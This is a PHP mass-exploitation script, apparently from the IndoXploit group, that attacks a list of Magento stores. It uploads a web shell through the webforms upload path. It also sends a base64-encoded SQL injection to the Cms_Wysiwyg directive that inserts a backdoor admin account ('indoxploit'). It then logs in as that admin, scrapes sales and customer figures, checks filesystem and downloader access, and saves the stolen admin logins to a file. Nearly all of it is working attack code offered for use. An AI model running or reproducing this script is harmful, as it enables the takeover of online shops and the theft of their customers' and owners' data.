<?php

error_reporting(0);

set_time_limit(0);

function cover() {

	print "[ ========================================== ]\n";	print "-----> Magento Mass Xploiter <-----\n";

	print "All in One Package: [webforms,add admin] Xploit\n";

	print "Coded by: l0c4lh34rtz ( Mr. Error 404 )\n";

	print "Greetz: IndoXploit - Sanjungan Jiwa\n";

	print "[ ========================================== ]\n\n";

}

function ngcurl($url, $post=null, $http) {

	$ch = curl_init($url);

	if($post != null) {

	  	curl_setopt($ch, CURLOPT_POST, true);

	  	curl_setopt($ch, CURLOPT_POSTFIELDS, $post);

	}

		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);

		curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.6) Gecko/20070725 Firefox/2.0.0.6"); 

	  	curl_setopt($ch, CURLOPT_COOKIEJAR, 'cookie.txt');

	  	curl_setopt($ch, CURLOPT_COOKIEFILE, 'cookie.txt');

	  	curl_setopt($ch, CURLOPT_COOKIESESSION, true);

	  	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);

	  	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);

	   	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);

	$result = curl_exec($ch);

	$info = curl_getinfo($ch);

	if($http == "y") {

		return $info['http_code'];

	} else {

		return $result;

	}

	  	curl_close($ch);

}

function xploit($url, $post) {

	$ch = curl_init(); 

		  curl_setopt($ch, CURLOPT_URL, $url); 

		  curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.6) Gecko/20070725 Firefox/2.0.0.6"); 

		  curl_setopt($ch, CURLOPT_TIMEOUT, 60); 

		  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 

		  curl_setopt($ch, CURLOPT_POSTFIELDS, $post);

		  curl_setopt($ch, CURLOPT_POST, 1); 

	$headers  = array();

	$headers[] = 'Accept-Encoding: gzip, deflate';

	$headers[] = 'Content-Type: application/x-www-form-urlencoded';

	  	  curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

		  curl_setopt($ch, CURLOPT_HEADER, 1);

	return curl_exec($ch);

		  curl_close($ch);

}

function ambilKata($param, $kata1, $kata2){

   if(strpos($param, $kata1) === FALSE) return FALSE;

   if(strpos($param, $kata2) === FALSE) return FALSE;

   $start = strpos($param, $kata1) + strlen($kata1);

   $end = strpos($param, $kata2, $start);

   $return = substr($param, $start, $end - $start);

   return $return;

}

function simpan($isi) {

	$f = fopen("idx_magento.txt","a+");

	fwrite($f, $isi);

	fclose($f);

}

$shell = "id.php"; // ganti dengan shell kalian.

$sites = explode("\n", file_get_contents($argv[1]));

if(isset($argv[1])) {

	cover();

	foreach($sites as $url) {

		if(!preg_match("/^http:\/\//", $url) AND !preg_match("/^https:\/\//", $url)) {

			$url = "http://$url";

		} else {

			$url = $url;

		}

		// set all var

		$url = "http://".parse_url($url, PHP_URL_HOST);

		preg_match("/Mage.Cookies.path     = '(.*?)';/", ngcurl($url, null, "g"), $mage_path);

		$path = $mage_path[1];

		$url = $url.$path;

		$url_exploit = $url."/index.php/";

		$url_exploit_add_admin = $url_exploit."/admin/Cms_Wysiwyg/directive/index/";

		$url_downloader = $url."/downloader/";

		$url_admin = $url_exploit."/admin/";

		$url_js = $url."/js/webforms/upload/";

		$robots = $url."/robots.txt";

		$log = $url."/result.txt";

		// end all var

		print "[+] URL: $url ";

		// set var all curl page

		$cek_web = ngcurl($url_exploit, null, "g"); // CURL to Index of site

		$cek_downloader = ngcurl($url_downloader, null, "g"); // CURL to Downloader Site

		$cek_admin = ngcurl($url_admin, null, "g"); // CURL to Admin Page

		$cek_webforms = ngcurl($url_js, null, "g");

		$cek_robot = ngcurl($robots, null, "y");

		$cek_log = ngcurl($log, null, "y");

		// end var all curl page

		// set all exploit webforms

		$post_js = array("files[]" => "@$shell");

		$exploit_js = ngcurl($url_js, $post_js, "g");

		preg_match('/"url":"(.*?)"/', $exploit_js, $sh);

		$sh[1] = str_replace("\\", "", $sh[1]);

		$cek_shell = ngcurl($sh[1], null, "g");

		// end set all exploit webforms

		// set all exploit add admin

		$postdata = 'filter=cG9wdWxhcml0eVtmcm9tXT0wJnBvcHVsYXJpdHlbdG9dPTMmcG9wdWxhcml0eVtmaWVsZF9leHByXT0wKTtTRVQgQFNBTFQgPSAncnAnO1NFVCBAUEFTUyA9IENPTkNBVChNRDUoQ09OQ0FUKCBAU0FMVCAsICdJbmRvWHBsb2l0JykgKSwgQ09OQ0FUKCc6JywgQFNBTFQgKSk7U0VMRUNUIEBFWFRSQSA6PSBNQVgoZXh0cmEpIEZST00gYWRtaW5fdXNlciBXSEVSRSBleHRyYSBJUyBOT1QgTlVMTDtJTlNFUlQgSU5UTyBgYWRtaW5fdXNlcmAgKGBmaXJzdG5hbWVgLCBgbGFzdG5hbWVgLGBlbWFpbGAsYHVzZXJuYW1lYCxgcGFzc3dvcmRgLGBjcmVhdGVkYCxgbG9nbnVtYCxgcmVsb2FkX2FjbF9mbGFnYCxgaXNfYWN0aXZlYCxgZXh0cmFgLGBycF90b2tlbmAsYHJwX3Rva2VuX2NyZWF0ZWRfYXRgKSBWQUxVRVMgKCdpbmRvJywneHBsb2l0JywnbmdhbnVAbmdhbnUuY29tJywnaW5kb3hwbG9pdCcsQFBBU1MsTk9XKCksMCwwLDEsQEVYVFJBLE5VTEwsIE5PVygpKTtJTlNFUlQgSU5UTyBgYWRtaW5fcm9sZWAgKHBhcmVudF9pZCx0cmVlX2xldmVsLHNvcnRfb3JkZXIscm9sZV90eXBlLHVzZXJfaWQscm9sZV9uYW1lKSBWQUxVRVMgKDEsMiwwLCdVJywoU0VMRUNUIHVzZXJfaWQgRlJPTSBhZG1pbl91c2VyIFdIRVJFIHVzZXJuYW1lID0gJ2luZG94cGxvaXQnKSwnRmlyc3RuYW1lJyk7%3D&___directive=e3tibG9jayB0eXBlPUFkbWluaHRtbC9yZXBvcnRfc2VhcmNoX2dyaWQgb3V0cHV0PWdldENzdkZpbGV9fQ&forwarded=1';

		$result = xploit($url_exploit_add_admin, $postdata);

		$ambil = htmlspecialchars(@file_get_contents($url_admin));

		preg_match("/<input name=\"form_key\" type=\"hidden\" value=\"(.*?)\">/", $ambil, $key);

		$post_login = array(

    		"form_key" => $key[1],

    		"login[username]" => "indoxploit",

    		"dummy" => "",

    		"login[password]" => "IndoXploit",

    	);

		$login_web = ngcurl($url_admin, $post_login, "g");

		preg_match_all('#<span class="price">(.*?)</span>#', $login_web, $matches);

		$links = array_unique($matches[1]);

		preg_match_all('/<span class=\"nowrap\" style=\"font-size:18px; color:#EA7601;\">(.*?)<span/', $login_web, $quality);

		$qual = array_unique($quality[1]);

		$key2 = ambilKata($login_web,"/filesystem/adminhtml_filesystem/index/key/","/");

    	$curl_filesystem = ngcurl($url_exploit."/filesystem/adminhtml_filesystem/index/key/$key2/", null, "g");

    	$post_downloader = array(

    		"username" => "indoxploit",

    		"password" => "IndoXploit",

    	);

    	$curl_downloader = ngcurl($url_downloader, $post_downloader, "g");

    	preg_match_all("/<td class=\"first\">(.*?)<\/td>/", $curl_downloader, $pack);

    	$key3 = ambilKata($login_web,"/customer/index/key/","/");

    	$curl_customer = ngcurl($url_exploit."/admin/customer/index/key/$key3/", null, "g");

    	preg_match_all("/<span id=\"customerGrid-total-count\" class=\"no-display\">(.*?)<\/span>/", $curl_customer, $cust);

    	// end set all exploit add admin

    	if(preg_match("/Mage.Cookies.domain/", $cek_web) OR preg_match("/magento/", $cek_downloader) OR preg_match("/magento/", $cek_admin)) {

			print "[Magento]\n";

			print "[ ==================================================== ]\n";

			print "[+] $robots -> ";

			if($cek_robot == 200) {

				print "Found!\n";

			} else {

				print "Not Found!\n";

			}

			print "[+] $log -> ";

			if($cek_log == 200) {

				print "Found!\n";

			} else {

				print "Not Found!\n";

			}

			print "[ ==================================================== ]\n";

			print "[+] Trying to exploit [Webforms]: ";

			if(preg_match("[]", $cek_webforms) AND !preg_match("/404|Not Found|Error|Forbidden|403/i", $cek_webforms)) {

				print "Vuln | ";

				if(preg_match("/{$shell}|webforms/", $exploit_js)) {

					print "Xploited!\n";

					if(preg_match("/indoxploit|upload|linux|windows|pass|password/i", $cek_shell) AND !preg_match("/forbidden|404|error|internal server error|500|406/i", $cek_shell)) {

						print "[+] Shell: ".$sh[1]."\n";

					} else {

						print "[+] Shell Error\n";

					}

				} else {

					print "Not Xploited.\n";	

				}

			} else {

				print "Not Vuln\n";

			}

			print "[+] Trying to exploit [add admin]: ";

			if(preg_match('#200 OK#', $result)) {

				print "Xploited! | ";

				if(preg_match('/Log Out|indoxploit/', $login_web)) {

					print "[Login: OK]\n";

					print "[ ====================[ $$$$$$$$ ]==================== ]\n";

					print "[+] Lifetime Sales: ".$links[0]."\n";

					print "[+] Average Orders: ".$links[1]."\n";

					print "[+] Quantity Orders: ".$qual[3][0]."\n";

					print "[+] Total Customers: ".$cust[1][0]." Customers\n";

					print "[ ====================[ $$$$$$$$ ]==================== ]\n";

					print "[ ====================[ /\/\/\/\ ]==================== ]\n";

					print "[+] Filesystem: ";

					if(preg_match("/File System/", $curl_filesystem)) {

    			   		print "Found!\n";

    			   	} else {

    			   		print "Not Found.\n";

    			   	}

    			   	print "[+] Downloader: ";

    			   	if(preg_match("/Magento Downloader/", $cek_downloader)) {

    		    		print "Found! | ";

    		    		if(preg_match("/Return to Admin|Log Out/i", $curl_downloader)) {

    		    			if(preg_match("/Your Magento folder does not have sufficient write permissions./", $curl_downloader)) {

    		 	   				$stat_down = "Not Writeable.";

    		    			} else {

    		    				$stat_down = "Writeable";

    		    			}

    		    			$in = 0;

    		    			print "[Login: OK] [$stat_down]\n";

    		    			//print "[+] Packages installed: \n";

    		    			foreach($pack[1] as $packages) {

    		    				$in++;

    		    				//print "-> $packages\n";

    		    			}

    		    			print "[+] Installed packages: (".$in.") Packages\n";

    		    		} else {

    		    			print "[Login Downloader Failed]\n";

    		    		}

    		 	   	} else {

    		    		print "[Not Found]\n";

    		  	  	}

    		  	  	print "[ ====================[ \/\/\/\/ ]==================== ]\n";

    		  	  	print "[ ==================================================== ]\n";

    		  	  	print "[+] username: indoxploit\n";

    		  	  	print "[+] password: IndoXploit\n";

					print "[+] Login Admin: $url_admin\n";

					print "[ ==================================================== ]\n\n";

					simpan("OK -> $url_admin | username: indoxploit | password: IndoXploit\n");

				} else {

					print "[Login Admin Failed]\n\n";

				}

			} else {

				print "Not Vuln\n\n";

			}

		} else {

			print "[Not Magento]\n\n";

		}

	}

}

?>
